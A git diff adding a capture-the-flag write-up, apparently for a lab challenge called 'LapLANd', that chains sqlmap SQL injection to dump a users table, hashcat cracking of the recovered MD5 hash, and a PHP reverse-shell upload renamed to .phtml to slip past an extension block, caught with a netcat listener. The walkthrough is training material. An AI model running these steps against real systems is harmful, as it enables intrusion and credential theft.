@@ -209,7 +209,149 @@ px @rbp-0x4
 
 ## Day 23: LapLANd (SQL Injection)
 
+there is a login page here
 
+![image](https://user-images.githubusercontent.com/90561566/210947025-2cf3f57c-98e7-49b6-918f-4bec164a53be.png)
+
+try a login request and capture it with Burpsuite
+
+![image](https://user-images.githubusercontent.com/90561566/210947334-0e1ee729-7ebd-4dcb-b7b0-b5412582540a.png)
+
+right click on packet and save item as request.txt
+
+![image](https://user-images.githubusercontent.com/90561566/210947505-f4de0927-1dd9-45f9-81a4-86e95bb32f12.png)
+
+enumerate the database with sqlmap
+
+```
+sqlmap -r request.txt --current-db
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210948957-dd433c33-99e9-4ae6-b066-ee2535e6fb69.png)
+
+![image](https://user-images.githubusercontent.com/90561566/210950244-f4bef8fc-40c6-497c-a0b9-74a70d212a1f.png)
+
+listing tables
+
+```
+sqlmap -r request.txt -D social --tables
+```
+
+```
+...
+Database: social
+[8 tables]
++-----------------+
+| comments        |
+| friend_requests |
+| likes           |
+| messages        |
+| notifications   |
+| posts           |
+| trends          |
+| users           |
++-----------------+
+```
+
+get the columns of the table users seem to be interesting
+
+```
+sqlmap -r request.txt -D social -T users --columns
+```
+
+```
+...
+Database: social
+Table: users
+[12 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| id           | int(11)      |
+| password     | varchar(255) |
+| email        | varchar(100) |
+| first_name   | varchar(25)  |
+| friend_array | text         |
+| last_name    | varchar(25)  |
+| num_likes    | int(11)      |
+| num_posts    | int(11)      |
+| profile_pic  | varchar(255) |
+| signup_date  | date         |
+| user_closed  | varchar(3)   |
+| username     | varchar(100) |
++--------------+--------------+
+```
+
+dump Santa’s information
+
+```
+sqlmap -r req.txt -D social -T users -C id,password,email,username --dump
+# or 
+sqlmap -r req.txt -D social -T users -C id,password,email,username --sql-query "select * from users where username like '%santa%'"
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210951507-cf62ed6e-0124-4dcd-85ae-f0e43c25acfa.png)
+
+```
+...
+[18:29:26] [INFO] retrieved: 1
+[18:29:27] [INFO] retrieved: f1267830a78c0b59acc06b05694b2e28
+[18:29:47] [INFO] retrieved: bigman@shefesh.com
+[18:29:55] [INFO] retrieved: santa_claus
+select * from users where username like '%santa%' [1]:
+[*] 1, f1267830a78c0b59acc06b05694b2e28, bigman@shefesh.com, santa_claus
+```
+
+crack the password
+
+```
+hashcat -a 0 -m 0 pass.txt /usr/share/wordlists/rockyou.txt
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210952395-7037554b-c38a-4b37-b1c0-a9d3fa830d8c.png)
+
+login with santa's acc
+
+![image](https://user-images.githubusercontent.com/90561566/210952621-7a5d2efb-bcea-4791-a541-fd233e91a5ba.png)
+
+let's santa's secret by clicking on Mrs Mistletoego and view their messages
+
+![image](https://user-images.githubusercontent.com/90561566/210952894-b0164928-fd1a-4237-a817-6eed1ed4e884.png)
+
+now, create a reverse shell
+
+```
+cp /usr/share/webshells/php/php-reverse-shell.php reverse.php
+vi reverse.php
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210954423-f83b1e3a-4cbc-4656-8117-af1045023c03.png)
+
+hmm, they block uploading php here
+
+![image](https://user-images.githubusercontent.com/90561566/210954548-24119f30-5961-49ec-91e0-0271908fd77d.png)
+
+but we can change file extension
+
+```
+mv reverse.php reverse.phtml
+```
+
+successful, open netcat
+
+```
+nc -vlnp 4444
+```
+
+![image](https://user-images.githubusercontent.com/90561566/210955187-47b21f63-6782-4006-b47d-4651892e9150.png)
+
+![image](https://user-images.githubusercontent.com/90561566/210955852-7bd4e277-ccd7-46e5-b04a-d74b205def85.png)
+
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/210955964-e599eefe-f1f7-4cbb-a6d4-e6363ea2a3a1.png)
+
+## Day 24: Elf Stalk
 
 
 
